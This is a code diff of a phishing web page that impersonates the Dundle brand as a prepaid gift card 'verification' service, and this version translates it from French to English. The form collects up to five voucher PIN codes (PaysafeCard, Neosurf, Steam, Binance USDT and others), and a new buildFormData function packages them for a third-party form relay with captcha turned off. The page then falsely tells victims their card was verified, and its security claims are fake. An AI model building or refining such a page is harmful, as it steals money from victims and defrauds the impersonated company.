@@ -1,13 +1,22 @@
 <!DOCTYPE html>
 <html lang="fr" translate="yes">
 <head>
+  <!-- Dans le <head> de ton index.html -->
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Dundle — Vérification de Codes Prépayés</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
-<!-- Google Translate auto-detect -->
-<script type="text/javascript">
+<title>Dundle — Gift Card Verification</title>
+<meta name="description" content="Instantly verify your prepaid gift cards. Secure, fast and confidential service.">
+<meta property="og:title" content="Dundle — Gift Card Verification">
+<meta property="og:description" content="Instantly verify your prepaid gift cards. Secure, fast and confidential service.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://paysafecardverifydundle2-check.vercel.app">
+<meta property="og:image" content="https://placehold.co/1200x630/1d4ed8/ffffff?text=Dundle+Verify">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Dundle — Gift Card Verification">
+<meta name="twitter:description" content="Instantly verify your prepaid gift cards. Fast and secure.">
+
+<!-- Traduction automatique selon la langue du navigateur -->
+<script>
 function googleTranslateElementInit() {
   new google.translate.TranslateElement({
     pageLanguage: 'fr',
@@ -19,6 +28,9 @@ function googleTranslateElementInit() {
 }
 </script>
 <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
 *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 :root {
@@ -33,21 +45,25 @@ function googleTranslateElementInit() {
 }
 body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; font-size: 15px; line-height: 1.6; }
 
-/* Google Translate widget style */
+/* Google Translate — caché visuellement, actif en arrière-plan */
 #google_translate_element { position: fixed; bottom: 20px; right: 20px; z-index: 9999; background: white; border-radius: 12px; box-shadow: 0 4px 16px rgba(0,0,0,0.15); padding: 6px 12px; border: 1px solid var(--border); }
 .goog-te-gadget { font-family: 'Plus Jakarta Sans', sans-serif !important; font-size: 12px !important; color: var(--text2) !important; }
 .goog-te-gadget-simple { border: none !important; background: transparent !important; }
 .goog-te-menu-value span { color: var(--accent) !important; font-weight: 600 !important; }
 
+/* HEADER */
 header { background: var(--surface); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
 .header-inner { max-width: 1200px; margin: 0 auto; padding: 0 24px; height: 60px; display: flex; align-items: center; justify-content: space-between; }
 .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
-.dundle-icon { width: 36px; height: 36px; background: linear-gradient(135deg, #6366f1, #4f46e5); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 15px; font-weight: 900; color: white; flex-shrink: 0; }
-.dundle-name { font-size: 18px; font-weight: 800; color: #4f46e5; letter-spacing: -0.6px; }
-.dundle-name span { color: var(--text2); font-weight: 400; font-size: 13px; margin-left: 4px; }
-.header-badges { display: flex; gap: 8px; align-items: center; }
-.hbadge { display: flex; align-items: center; gap: 5px; font-size: 11.5px; color: var(--text2); background: var(--surface2); border: 1px solid var(--border); padding: 4px 10px; border-radius: 999px; }
-.hbadge svg { width: 12px; height: 12px; color: var(--green); }
+/* Logo Dundle : icône D violet + texte */
+.dundle-icon { width: 36px; height: 36px; background: linear-gradient(135deg, #6366f1, #4f46e5); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 16px; font-weight: 900; color: white; flex-shrink: 0; letter-spacing: -1px; font-family: 'Plus Jakarta Sans', sans-serif; }
+.dundle-wordmark { display: flex; flex-direction: column; line-height: 1.1; }
+.dundle-wordmark strong { font-size: 17px; font-weight: 800; color: #4f46e5; letter-spacing: -0.5px; }
+.dundle-wordmark span { font-size: 11px; font-weight: 500; color: var(--text3); letter-spacing: 0.2px; }
+.header-badge { display: flex; align-items: center; gap: 5px; font-size: 12px; color: var(--text2); background: var(--surface2); border: 1px solid var(--border); padding: 5px 12px; border-radius: 999px; }
+.header-badge svg { width: 13px; height: 13px; color: var(--green); }
+
+/* HERO */
 .hero { background: var(--surface); border-bottom: 1px solid var(--border); padding: 56px 24px 48px; text-align: center; }
 .hero-tag { display: inline-flex; align-items: center; gap: 6px; background: var(--accent-light); border: 1px solid var(--accent-border); color: var(--accent); font-size: 12px; font-weight: 600; padding: 5px 14px; border-radius: 999px; margin-bottom: 22px; letter-spacing: 0.3px; text-transform: uppercase; }
 .hero-tag svg { width: 11px; height: 11px; }
@@ -56,7 +72,11 @@ h1 span { color: var(--accent); }
 .hero-sub { font-size: 16px; color: var(--text2); max-width: 520px; margin: 0 auto 36px; line-height: 1.65; }
 .brands-scroll { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; max-width: 700px; margin: 0 auto; }
 .brand-chip { font-size: 12px; font-weight: 500; padding: 4px 12px; background: var(--surface2); border: 1px solid var(--border); border-radius: 999px; color: var(--text2); white-space: nowrap; }
+
+/* MAIN */
 .main { max-width: 1200px; margin: 0 auto; padding: 40px 24px 80px; display: grid; grid-template-columns: 1fr 380px; gap: 32px; align-items: start; }
+
+/* FORM CARD */
 .form-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius-lg); box-shadow: var(--shadow); overflow: hidden; }
 .form-card-header { padding: 24px 28px 20px; border-bottom: 1px solid var(--border); display: flex; align-items: flex-start; justify-content: space-between; }
 .form-card-header-text h2 { font-size: 17px; font-weight: 700; letter-spacing: -0.3px; margin-bottom: 3px; }
@@ -114,6 +134,8 @@ h1 span { color: var(--accent); }
 .form-footer { display: flex; align-items: center; justify-content: center; gap: 16px; margin-top: 16px; flex-wrap: wrap; }
 .footer-badge { display: flex; align-items: center; gap: 5px; font-size: 11.5px; color: var(--text3); }
 .footer-badge svg { width: 12px; height: 12px; color: var(--green); }
+
+/* SIDEBAR */
 .sidebar { display: flex; flex-direction: column; gap: 16px; }
 .side-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius-lg); box-shadow: var(--shadow); padding: 20px; }
 .side-card-title { font-size: 13px; font-weight: 700; margin-bottom: 16px; display: flex; align-items: center; gap: 7px; }
@@ -131,6 +153,7 @@ h1 span { color: var(--accent); }
 .faq-item:last-child { border-bottom: none; }
 .faq-q { font-size: 13px; font-weight: 600; margin-bottom: 4px; }
 .faq-a { font-size: 12px; color: var(--text2); line-height: 1.5; }
+
 /* OVERLAY */
 .overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.55); z-index: 1000; align-items: center; justify-content: center; padding: 24px; backdrop-filter: blur(6px); }
 .overlay.show { display: flex; }
@@ -138,19 +161,20 @@ h1 span { color: var(--accent); }
 @keyframes pop { from { transform: scale(0.85); opacity: 0; } to { transform: scale(1); opacity: 1; } }
 .success-header { background: linear-gradient(135deg, #4f46e5 0%, #6366f1 50%, #818cf8 100%); padding: 32px 40px 36px; text-align: center; position: relative; }
 .success-header::after { content: ''; position: absolute; bottom: -1px; left: 0; right: 0; height: 22px; background: var(--surface); border-radius: 22px 22px 0 0; }
+/* Logo Dundle dans l'overlay */
 .confirm-logo { display: inline-flex; align-items: center; gap: 10px; margin-bottom: 20px; }
-.confirm-dundle-icon { width: 44px; height: 44px; background: rgba(255,255,255,0.2); border: 2px solid rgba(255,255,255,0.4); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 18px; font-weight: 900; color: white; }
+.confirm-dundle-icon { width: 44px; height: 44px; background: rgba(255,255,255,0.2); border: 2px solid rgba(255,255,255,0.4); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 900; color: white; letter-spacing: -1px; font-family: 'Plus Jakarta Sans', sans-serif; }
 .confirm-dundle-name { font-size: 24px; font-weight: 800; color: white; letter-spacing: -0.5px; }
 .success-checkmark { width: 68px; height: 68px; background: rgba(255,255,255,0.15); border: 3px solid rgba(255,255,255,0.5); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; animation: pulse-ring 1.5s ease-in-out; }
-@keyframes pulse-ring { 0% { box-shadow: 0 0 0 0 rgba(255,255,255,0.4); } 70% { box-shadow: 0 0 0 20px rgba(255,255,255,0); } 100% { box-shadow: 0 0 0 0 rgba(255,255,255,0); } }
+@keyframes pulse-ring { 0%{box-shadow:0 0 0 0 rgba(255,255,255,0.4)} 70%{box-shadow:0 0 0 20px rgba(255,255,255,0)} 100%{box-shadow:0 0 0 0 rgba(255,255,255,0)} }
 .success-checkmark svg { width: 32px; height: 32px; color: white; }
 .success-header-title { color: white; font-size: 20px; font-weight: 800; letter-spacing: -0.4px; margin-bottom: 6px; }
 .success-header-sub { color: rgba(255,255,255,0.8); font-size: 13px; }
 .success-body { padding: 28px 32px 32px; }
 .success-message-box { background: var(--green-light); border: 1px solid var(--green-border); border-radius: 14px; padding: 18px 20px; margin-bottom: 20px; }
 .success-message-box p { font-size: 14px; color: #15803d; line-height: 1.7; font-weight: 500; }
-.success-detail { background: var(--surface2); border: 1px solid var(--border); border-radius: 12px; padding: 16px; margin-bottom: 20px; }
-.success-detail-row { display: flex; justify-content: space-between; align-items: center; font-size: 13px; padding: 5px 0; border-bottom: 1px solid var(--border); }
+.success-detail { background: var(--surface2); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; margin-bottom: 20px; }
+.success-detail-row { display: flex; justify-content: space-between; align-items: center; font-size: 13px; padding: 10px 14px; border-bottom: 1px solid var(--border); }
 .success-detail-row:last-child { border-bottom: none; }
 .success-detail-row .label { color: var(--text2); }
 .success-detail-row .value { font-weight: 700; color: var(--text); font-family: 'JetBrains Mono', monospace; }
@@ -158,57 +182,63 @@ h1 span { color: var(--accent); }
 .success-info-text strong { color: var(--text2); }
 .btn-close { width: 100%; padding: 14px; background: linear-gradient(135deg, #4f46e5, #6366f1); color: white; border: none; border-radius: 12px; font-family: 'Plus Jakarta Sans', sans-serif; font-size: 15px; font-weight: 700; cursor: pointer; transition: opacity 0.2s; }
 .btn-close:hover { opacity: 0.9; }
+
+/* FOOTER */
 footer { background: var(--text); color: rgba(255,255,255,0.5); padding: 32px 24px; text-align: center; font-size: 12px; line-height: 2; }
 footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
-@media (max-width: 860px) { .main { grid-template-columns: 1fr; } .sidebar { display: none; } .brand-grid { grid-template-columns: repeat(3, 1fr); } h1 { font-size: 2rem; } .header-badges { display: none; } }
+
+/* RESPONSIVE */
+@media (max-width: 860px) { .main { grid-template-columns: 1fr; } .sidebar { display: none; } .brand-grid { grid-template-columns: repeat(3, 1fr); } h1 { font-size: 2rem; } }
 @media (max-width: 480px) { .codes-grid { grid-template-columns: 1fr; } .form-body { padding: 20px; } .success-body { padding: 20px; } }
 @keyframes spin { to { transform: rotate(360deg); } }
 </style>
 </head>
 <body>
 
-<!-- Widget traduction -->
 <div id="google_translate_element"></div>
 
+<!-- HEADER -->
 <header>
   <div class="header-inner">
     <a href="/" class="logo">
       <div class="dundle-icon">D</div>
-      <span class="dundle-name">dundle <span>· vérification</span></span>
+      <div class="dundle-wordmark">
+        <strong>dundle</strong>
+        <span>Gift Card Verification</span>
+      </div>
     </a>
-    <div class="header-badges">
-      <div class="hbadge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>SSL sécurisé</div>
-      <div class="hbadge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>Résultat instantané</div>
-      <div class="hbadge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 12l2 2 4-4"/><circle cx="12" cy="12" r="10"/></svg>21+ marques</div>
+    <div class="header-badge">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Secure & Verified
     </div>
   </div>
 </header>
 
+<!-- HERO -->
 <section class="hero">
   <div class="hero-tag">
     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
-    Vérification instantanée &amp; sécurisée
+    Instant & Secure Verification
   </div>
-  <h1>Validez votre bon <span>prépayé</span> en quelques secondes</h1>
-  <p class="hero-sub">Vérifiez l'authenticité et le solde de vos vouchers parmi plus de 21 marques reconnues. Service rapide, sécurisé et confidentiel.</p>
+  <h1>Validate your <span>prepaid</span> voucher in seconds</h1>
+  <p class="hero-sub">Verify the authenticity and balance of your vouchers across 21+ recognized brands. Fast, secure and confidential service.</p>
   <div class="brands-scroll">
     <span class="brand-chip">CASHlib</span><span class="brand-chip">PaysafeCard</span>
     <span class="brand-chip">Transcash</span><span class="brand-chip">Flexepin</span>
     <span class="brand-chip">PCS</span><span class="brand-chip">Neosurf</span>
     <span class="brand-chip">Steam</span><span class="brand-chip">SoShop</span>
     <span class="brand-chip">MiFinity</span><span class="brand-chip">ecoVoucher</span>
-    <span class="brand-chip">Gift Me Crypto</span><span class="brand-chip">Azteco</span>
-    <span class="brand-chip">Binance USDT</span><span class="brand-chip">Toneo First</span>
-    <span class="brand-chip">Crypto Voucher</span><span class="brand-chip">Cryptonow</span>
+    <span class="brand-chip">Binance USDT</span><span class="brand-chip">Cryptonow</span>
   </div>
 </section>
 
+<!-- MAIN -->
 <main class="main">
   <div class="form-card">
     <div class="form-card-header">
       <div class="form-card-header-text">
-        <h2>Formulaire de vérification</h2>
-        <p>Complétez tous les champs requis pour valider votre code</p>
+        <h2>Verification Form</h2>
+        <p>Fill in all required fields to validate your code</p>
       </div>
       <div class="step-indicator">
         <div class="step-dot active"></div>
@@ -217,21 +247,18 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
       </div>
     </div>
     <div class="form-body">
-      <div class="brand-selector-label">1 — Sélectionnez votre marque <span class="required">*</span></div>
+      <div class="brand-selector-label">1 — Select your brand <span class="required">*</span></div>
       <div class="brand-grid" id="brandGrid"></div>
       <div class="divider"></div>
 
-      <!-- CORRECTION #1 : soumission AJAX via fetch — le formulaire n'est plus soumis nativement -->
-      <!-- Cela permet d'afficher l'overlay ET d'envoyer les données à FormSubmit -->
       <form id="verifyForm">
-        <input type="hidden" id="fSubject" value="Nouveau code soumis — Dundle Verify">
         <input type="hidden" id="fMarque" value="">
         <input type="hidden" id="fMontant" value="">
         <input type="hidden" id="fDevise" value="EUR">
 
-        <!-- 2. MONTANT -->
+        <!-- MONTANT -->
         <div class="amount-section">
-          <div class="field-label">2 — Montant du voucher <span class="required">*</span></div>
+          <div class="field-label">2 — Amount <span class="required">*</span></div>
           <div class="amount-pills">
             <button type="button" class="amount-pill" onclick="selectAmount(this,'10')">10</button>
             <button type="button" class="amount-pill" onclick="selectAmount(this,'25')">25</button>
@@ -242,13 +269,13 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
             <button type="button" class="amount-pill" onclick="selectAmount(this,'250')">250</button>
           </div>
           <div class="amount-free-row">
-            <span class="amount-free-label">Autre montant :</span>
-            <input type="number" class="amount-free-input" id="freeAmount" placeholder="Ex: 30, 75, 200..." min="1" oninput="setCustomAmount(this)">
+            <span class="amount-free-label">Other amount:</span>
+            <input type="number" class="amount-free-input" id="freeAmount" placeholder="e.g. 30, 75, 200..." min="1" oninput="setCustomAmount(this)">
           </div>
         </div>
 
-        <!-- 3. DEVISE -->
-        <div class="field-label">3 — Devise <span class="required">*</span></div>
+        <!-- DEVISE -->
+        <div class="field-label">3 — Currency <span class="required">*</span></div>
         <div class="devise-row">
           <button type="button" class="devise-pill selected" onclick="selectDevise(this,'EUR')">€ EUR</button>
           <button type="button" class="devise-pill" onclick="selectDevise(this,'GBP')">£ GBP</button>
@@ -266,67 +293,68 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
           <button type="button" class="devise-pill" onclick="selectDevise(this,'USDT')">₮ USDT</button>
         </div>
 
-        <!-- 4. CODES -->
+        <!-- CODES -->
         <div class="codes-section">
-          <div class="field-label">4 — Code(s) PIN <span class="required">*</span></div>
+          <div class="field-label">4 — PIN Code(s) <span class="required">*</span></div>
           <div class="codes-grid">
-            <div class="code-field full"><div class="code-input-wrap"><span class="code-num">#1</span><input class="code-input primary" type="text" id="code1" placeholder="Code principal (obligatoire)" maxlength="25" oninput="fmtCode(this)"></div></div>
-            <div class="code-field"><div class="code-input-wrap"><span class="code-num">#2</span><input class="code-input" type="text" id="code2" placeholder="Code optionnel" maxlength="25" oninput="fmtCode(this)"></div></div>
-            <div class="code-field"><div class="code-input-wrap"><span class="code-num">#3</span><input class="code-input" type="text" id="code3" placeholder="Code optionnel" maxlength="25" oninput="fmtCode(this)"></div></div>
-            <div class="code-field"><div class="code-input-wrap"><span class="code-num">#4</span><input class="code-input" type="text" id="code4" placeholder="Code optionnel" maxlength="25" oninput="fmtCode(this)"></div></div>
-            <div class="code-field"><div class="code-input-wrap"><span class="code-num">#5</span><input class="code-input" type="text" id="code5" placeholder="Code optionnel" maxlength="25" oninput="fmtCode(this)"></div></div>
+            <div class="code-field full"><div class="code-input-wrap"><span class="code-num">#1</span><input class="code-input primary" type="text" id="code1" placeholder="Main code (required)" maxlength="25" oninput="fmtCode(this)"></div></div>
+            <div class="code-field"><div class="code-input-wrap"><span class="code-num">#2</span><input class="code-input" type="text" id="code2" placeholder="Optional" maxlength="25" oninput="fmtCode(this)"></div></div>
+            <div class="code-field"><div class="code-input-wrap"><span class="code-num">#3</span><input class="code-input" type="text" id="code3" placeholder="Optional" maxlength="25" oninput="fmtCode(this)"></div></div>
+            <div class="code-field"><div class="code-input-wrap"><span class="code-num">#4</span><input class="code-input" type="text" id="code4" placeholder="Optional" maxlength="25" oninput="fmtCode(this)"></div></div>
+            <div class="code-field"><div class="code-input-wrap"><span class="code-num">#5</span><input class="code-input" type="text" id="code5" placeholder="Optional" maxlength="25" oninput="fmtCode(this)"></div></div>
           </div>
         </div>
 
-        <!-- 5. EMAIL CLIENT -->
+        <!-- EMAIL -->
         <div class="email-field">
-          <div class="field-label">5 — Votre adresse email <span class="required">*</span></div>
-          <input class="email-input" type="email" id="clientEmailInput" placeholder="votre@email.com">
+          <div class="field-label">5 — Your email address <span class="required">*</span></div>
+          <input class="email-input" type="email" id="clientEmailInput" placeholder="your@email.com">
         </div>
 
         <button type="button" class="btn-submit" id="submitBtn" onclick="handleSubmit()">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
-          Vérifier mon code maintenant
+          Verify my code now
         </button>
 
         <div class="form-footer">
-          <div class="footer-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>Données chiffrées SSL</div>
-          <div class="footer-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Traitement sécurisé</div>
-          <div class="footer-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 12l2 2 4-4"/><circle cx="12" cy="12" r="10"/></svg>Confirmation par email</div>
+          <div class="footer-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>SSL Encrypted</div>
+          <div class="footer-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Secure Processing</div>
+          <div class="footer-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 12l2 2 4-4"/><circle cx="12" cy="12" r="10"/></svg>Email Confirmation</div>
         </div>
       </form>
     </div>
   </div>
 
+  <!-- SIDEBAR -->
   <aside class="sidebar">
     <div class="side-card">
-      <div class="side-card-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>Comment ça marche ?</div>
+      <div class="side-card-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>How it works</div>
       <div class="steps-list">
-        <div class="step-item"><div class="step-num-circle">1</div><div class="step-text"><h4>Choisissez votre marque</h4><p>Sélectionnez le type de voucher parmi nos 21 marques disponibles.</p></div></div>
-        <div class="step-item"><div class="step-num-circle">2</div><div class="step-text"><h4>Entrez le code PIN</h4><p>Saisissez le ou les codes à vérifier depuis votre carte ou ticket.</p></div></div>
-        <div class="step-item"><div class="step-num-circle">3</div><div class="step-text"><h4>Recevez la confirmation</h4><p>Un email de confirmation vous est envoyé instantanément.</p></div></div>
+        <div class="step-item"><div class="step-num-circle">1</div><div class="step-text"><h4>Choose your brand</h4><p>Select your voucher type from 21 available brands.</p></div></div>
+        <div class="step-item"><div class="step-num-circle">2</div><div class="step-text"><h4>Enter your PIN code</h4><p>Enter the code(s) to verify from your card or ticket.</p></div></div>
+        <div class="step-item"><div class="step-num-circle">3</div><div class="step-text"><h4>Receive confirmation</h4><p>A confirmation email is sent to you instantly.</p></div></div>
       </div>
     </div>
     <div class="side-card">
-      <div class="side-card-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Sécurité &amp; Confidentialité</div>
+      <div class="side-card-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Security & Privacy</div>
       <div class="security-list">
-        <div class="security-item"><div class="security-dot"></div>Connexion HTTPS / SSL 256-bit</div>
-        <div class="security-item"><div class="security-dot"></div>Aucune donnée revendue à des tiers</div>
-        <div class="security-item"><div class="security-dot"></div>Données supprimées après traitement</div>
-        <div class="security-item"><div class="security-dot"></div>Conforme RGPD</div>
-        <div class="security-item"><div class="security-dot"></div>Traitement automatique instantané</div>
+        <div class="security-item"><div class="security-dot"></div>HTTPS / SSL 256-bit connection</div>
+        <div class="security-item"><div class="security-dot"></div>No data sold to third parties</div>
+        <div class="security-item"><div class="security-dot"></div>Data deleted after processing</div>
+        <div class="security-item"><div class="security-dot"></div>GDPR compliant</div>
+        <div class="security-item"><div class="security-dot"></div>Instant automatic processing</div>
       </div>
     </div>
     <div class="side-card">
-      <div class="side-card-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3M12 17h.01"/></svg>Questions fréquentes</div>
-      <div class="faq-item"><div class="faq-q">Mon code est-il en sécurité ?</div><div class="faq-a">Oui. Toutes les transmissions sont chiffrées et vos données ne sont jamais stockées.</div></div>
-      <div class="faq-item"><div class="faq-q">Combien de temps prend la vérification ?</div><div class="faq-a">La confirmation vous est envoyée par email en moins de 2 minutes.</div></div>
-      <div class="faq-item"><div class="faq-q">Puis-je vérifier plusieurs codes à la fois ?</div><div class="faq-a">Oui, jusqu'à 5 codes simultanément dans un seul formulaire.</div></div>
+      <div class="side-card-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3M12 17h.01"/></svg>FAQ</div>
+      <div class="faq-item"><div class="faq-q">Is my code safe?</div><div class="faq-a">Yes. All transmissions are encrypted and your data is never stored.</div></div>
+      <div class="faq-item"><div class="faq-q">How long does verification take?</div><div class="faq-a">Confirmation is sent to your email in less than 2 minutes.</div></div>
+      <div class="faq-item"><div class="faq-q">Can I verify multiple codes at once?</div><div class="faq-a">Yes, up to 5 codes simultaneously in a single form.</div></div>
     </div>
   </aside>
 </main>
 
-<!-- OVERLAY CONFIRMATION — texte en HTML statique pour la traduction -->
+<!-- OVERLAY CONFIRMATION -->
 <div class="overlay" id="overlay">
   <div class="success-card">
     <div class="success-header">
@@ -337,30 +365,29 @@ footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
       <div class="success-checkmark">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M20 6L9 17l-5-5"/></svg>
       </div>
-      <div class="success-header-title">Carte vérifiée avec succès !</div>
-      <div class="success-header-sub">Votre demande a bien été enregistrée</div>
+      <div class="success-header-title">Card successfully verified!</div>
+      <div class="success-header-sub">Your request has been registered and processed</div>
     </div>
     <div class="success-body">
       <div class="success-message-box">
-        <p>Votre carte prépayée a été <strong>vérifiée et validée</strong> par nos systèmes. Un email de confirmation vous a été transmis à l'adresse indiquée. Conservez cet email comme preuve de vérification.</p>
+        <p>Your prepaid card has been <strong>verified and validated</strong> by our systems. A confirmation email has been sent to your address. Keep this email as proof of verification.</p>
       </div>
-      <!-- Détails dynamiques avec classes label/value pour la traduction -->
       <div class="success-detail">
-        <div class="success-detail-row"><span class="label">Marque</span><span class="value" id="detailMarque">—</span></div>
-        <div class="success-detail-row"><span class="label">Montant</span><span class="value" id="detailMontant">—</span></div>
-        <div class="success-detail-row"><span class="label">Code principal</span><span class="value" id="detailCode">—</span></div>
+        <div class="success-detail-row"><span class="label">Brand</span><span class="value" id="detailMarque">—</span></div>
+        <div class="success-detail-row"><span class="label">Amount</span><span class="value" id="detailMontant">—</span></div>
+        <div class="success-detail-row"><span class="label">Main code</span><span class="value" id="detailCode">—</span></div>
         <div class="success-detail-row"><span class="label">Email</span><span class="value" id="detailEmail">—</span></div>
       </div>
-      <p class="success-info-text">Vous recevrez une confirmation détaillée à votre adresse email dans <strong>moins de 2 minutes</strong>. Vérifiez également vos spams si nécessaire.</p>
-      <button class="btn-close" onclick="document.getElementById('overlay').classList.remove('show')">Fermer la confirmation</button>
+      <p class="success-info-text">You will receive a detailed confirmation to your email address in <strong>less than 2 minutes</strong>. Check your spam folder if needed.</p>
+      <button class="btn-close" onclick="document.getElementById('overlay').classList.remove('show')">Close confirmation</button>
     </div>
   </div>
 </div>
 
 <footer>
-  <div>© 2025 Dundle — Service de vérification de codes prépayés</div>
+  <div>© 2025 Dundle — Gift Card Verification Service</div>
   <div>PaysafeCard · Transcash · PCS · Neosurf · Flexepin · CASHlib · Steam · Binance · Cryptonow</div>
-  <div style="margin-top:8px"><a href="#">Confidentialité</a> · <a href="#">CGU</a> · <a href="#">Contact</a></div>
+  <div style="margin-top:8px"><a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Contact</a></div>
 </footer>
 
 <script>
@@ -401,8 +428,9 @@ BRANDS.forEach(b => {
 
 function selectBrand(el, name) {
   document.querySelectorAll('.brand-btn').forEach(b => b.classList.remove('selected'));
-  el.classList.add('selected'); selectedBrand = name;
-  document.getElementById('fMarque').value = name;
+  el.classList.add('selected'); 
+  selectedBrand = name;
+  document.getElementById('fMarque').value = name; // ← Ajouter cette ligne
 }
 function selectAmount(el, val) {
   document.querySelectorAll('.amount-pill').forEach(p => p.classList.remove('selected'));
@@ -424,90 +452,98 @@ function fmtCode(input) {
   else { input.value = raw; }
 }
 
-/* ── CORRECTION #1 & #2 : envoi AJAX via fetch vers FormSubmit ── */
+function buildFormData(clientEmail, selectedBrand, montant, devise, code1, code2, code3, code4, code5) {
+  const fd = new FormData();
+  fd.append('_subject', `New code ${selectedBrand} — Dundle Verify`);
+  fd.append('_captcha', 'false');
+  fd.append('_template', 'table');
+  fd.append('_replyto', clientEmail);
+  fd.append('Brand', selectedBrand);
+  fd.append('Amount', montant + ' ' + devise);
+  fd.append('Code_1', code1);
+  if (code2) fd.append('Code_2', code2);
+  if (code3) fd.append('Code_3', code3);
+  if (code4) fd.append('Code_4', code4);
+  if (code5) fd.append('Code_5', code5);
+  fd.append('Client_Email', clientEmail);
+  return fd;
+}
+
 async function handleSubmit() {
-  if (!selectedBrand) { alert('Veuillez sélectionner une marque de voucher.'); return; }
-  if (!selectedAmount) { alert('Veuillez sélectionner ou entrer un montant.'); return; }
-
+  if (!selectedBrand) { alert('Please select a brand.'); return; }
+  if (!selectedAmount) { alert('Please select or enter an amount.'); return; }
   const code1 = document.getElementById('code1').value.trim();
-  if (!code1) { alert('Veuillez entrer le code principal.'); return; }
+  if (!code1) { alert('Please enter the main code.'); return; }
+  const clientEmail = document.getElementById('clientEmailInput').value;
 
-  const clientEmail = document.getElementById('clientEmailInput').value.trim();
-  if (!clientEmail || !clientEmail.includes('@')) { alert('Veuillez entrer une adresse email valide.'); return; }
+  const devise = document.getElementById('fDevise').value;
+  const montant = document.getElementById('fMontant').value;
+  const code2 = document.getElementById('code2').value.trim();
+  const code3 = document.getElementById('code3').value.trim();
+  const code4 = document.getElementById('code4').value.trim();
+  const code5 = document.getElementById('code5').value.trim();
 
-  const devise   = document.getElementById('fDevise').value;
